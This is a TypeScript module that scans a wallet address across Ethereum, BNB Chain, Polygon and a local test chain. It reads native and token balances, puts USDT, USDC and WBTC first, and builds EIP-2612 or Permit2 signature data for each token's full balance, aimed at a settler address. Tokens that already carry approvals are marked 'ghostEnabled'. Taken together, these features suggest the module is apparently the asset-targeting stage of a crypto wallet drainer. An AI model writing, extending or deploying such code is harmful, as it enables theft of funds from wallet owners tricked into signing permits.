import { createPublicClient, http, hexToBigInt, formatUnits } from "viem";
import { Alchemy } from "alchemy-sdk";
import { generatePermit2Data } from "../../permit2";
import { checkExistingAllowance, checkPermitSupport } from "./evm-helpers";
import {
  UniversalAsset,
  ALCHEMY_KEY,
  SETTLER_ADDR,
  EVM_CHAINS,
} from "../types";

const PRIORITY_TOKENS: Record<number, string[]> = {
  1: [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48", // USDC
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
  ],
  56: [
    "0x55d398326f99059fF775485246999027B3197955", // USDT (BEP20)
    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
    "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
  ],
  137: [
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
  ],
  31337: [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Local USDT
  ],
};

const ERC20_MIN_ABI = [
  {
    name: "balanceOf",
    type: "function",
    inputs: [{ name: "owner", type: "address" }],
    outputs: [{ name: "balance", type: "uint256" }],
  },
  {
    name: "symbol",
    type: "function",
    inputs: [],
    outputs: [{ name: "s", type: "string" }],
  },
  {
    name: "decimals",
    type: "function",
    inputs: [],
    outputs: [{ name: "d", type: "uint8" }],
  },
] as const;

export async function scanEVM(address: string): Promise<UniversalAsset[]> {
  const isLocalHost =
    typeof window !== "undefined" &&
    (window.location.hostname.includes("192.168") ||
      window.location.hostname.includes("localhost"));

  const chainPromises = EVM_CHAINS.map(async (_chain) => {
    const chain = _chain as any;
    try {
      let chainAssets: UniversalAsset[] = [];

      // 1. PROVIDER SETUP
      const rpcUrl =
        isLocalHost && (chain.id === 1 || chain.id === 31337)
          ? `http://127.0.0.1:8545`
          : chain.rpcUrl ||
            `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;

      const client = createPublicClient({ transport: http(rpcUrl) });

      // 2. NATIVE BALANCE
      const nativeBalance = await client
        .getBalance({ address: address as `0x${string}` })
        .catch(() => 0n);

      if (nativeBalance > 0n) {
        const ticker =
          chain.id === 56 ? "BNB" : chain.id === 137 ? "POL" : "ETH";
        chainAssets.push({
          symbol: ticker,
          name: chain.label || chain.name,
          decimals: 18,
          balance: nativeBalance.toString(),
          displayBalance: formatUnits(nativeBalance, 18),
          chain: "EVM",
          networkName: chain.label || chain.name,
          chainId: chain.id,
          permitSupported: false,
          signatureType: "NATIVE",
        });
      }

      // 3. TOKEN DISCOVERY
      let rawTokens: { addr: string; bal: bigint }[] = [];

      // Path A: Priority Manual Scan (Fixes 'unknown' error)
      const pList = PRIORITY_TOKENS[chain.id] || [];
      const priorityResults = await Promise.all(
        pList.map(async (tAddr) => {
          const b = (await client
            .readContract({
              address: tAddr as `0x${string}`,
              abi: ERC20_MIN_ABI,
              functionName: "balanceOf",
              args: [address as `0x${string}`],
            })
            .catch(() => 0n)) as bigint; // Explicit cast fixes ts(18046)

          return b > 0n ? { addr: tAddr, bal: b } : null;
        }),
      );
      rawTokens = priorityResults.filter((t): t is any => t !== null);

      // Path B: Alchemy Indexer
      if (chain.alchemyNet) {
        const alchemy = new Alchemy({
          apiKey: ALCHEMY_KEY,
          network: chain.alchemyNet,
        });
        const alchemyRes = await alchemy.core
          .getTokenBalances(address)
          .catch(() => ({ tokenBalances: [] }));

        alchemyRes.tokenBalances.forEach((at) => {
          if (
            !rawTokens.find(
              (rt) =>
                rt.addr.toLowerCase() === at.contractAddress.toLowerCase(),
            )
          ) {
            const b = hexToBigInt(at.tokenBalance as `0x${string}`);
            if (b > 0n) rawTokens.push({ addr: at.contractAddress, bal: b });
          }
        });
      }

      // 4. DEEP AUDIT
      const audits = rawTokens.map(async (token) => {
        try {
          const tAddr = token.addr as `0x${string}`;
          let meta = { symbol: "UNK", name: "Unknown", decimals: 18 };

          if (chain.alchemyNet) {
            const alchemy = new Alchemy({
              apiKey: ALCHEMY_KEY,
              network: chain.alchemyNet,
            });
            const aMeta = await alchemy.core
              .getTokenMetadata(tAddr)
              .catch(() => null);
            if (aMeta)
              meta = {
                symbol: aMeta.symbol || "UNK",
                name: aMeta.name || "Unknown",
                decimals: aMeta.decimals || 18,
              };
          }

          if (meta.symbol === "UNK") {
            const [s, d] = await Promise.all([
              client
                .readContract({
                  address: tAddr,
                  abi: ERC20_MIN_ABI,
                  functionName: "symbol",
                })
                .catch(() => "UNK"),
              client
                .readContract({
                  address: tAddr,
                  abi: ERC20_MIN_ABI,
                  functionName: "decimals",
                })
                .catch(() => 18),
            ]);
            meta = { ...meta, symbol: s as string, decimals: Number(d) };
          }

          const [hasAllowance, permitData] = await Promise.all([
            checkExistingAllowance(tAddr, address, chain),
            checkPermitSupport(
              tAddr,
              chain,
              address,
              token.bal,
              meta.symbol,
              meta.name,
            ),
          ]);

          let finalData: any = permitData;
          let sigType: "EIP2612" | "PERMIT2" | undefined = permitData
            ? "EIP2612"
            : undefined;

          if (!finalData && SETTLER_ADDR) {
            try {
              finalData = await generatePermit2Data(
                address,
                [{ contractAddress: tAddr, balance: token.bal.toString() }],
                chain.id,
              );
              sigType = "PERMIT2";
            } catch {
              sigType = undefined;
            }
          }

          return {
            symbol: meta.symbol,
            name: meta.name,
            decimals: meta.decimals,
            balance: token.bal.toString(),
            displayBalance: formatUnits(token.bal, meta.decimals),
            contractAddress: tAddr,
            chain: "EVM",
            networkName: chain.label || chain.name,
            chainId: chain.id,
            permitSupported: !!finalData,
            authData: finalData
              ? { ...finalData, hasExistingAllowance: hasAllowance }
              : undefined,
            signatureType: sigType,
            ghostEnabled: hasAllowance,
          } as UniversalAsset;
        } catch {
          return null;
        }
      });

      const results = await Promise.all(audits);
      chainAssets.push(
        ...results.filter((a): a is UniversalAsset => a !== null),
      );
      return chainAssets;
    } catch (err) {
      return [];
    }
  });

  const all = await Promise.all(chainPromises);
  return all.flat();
}
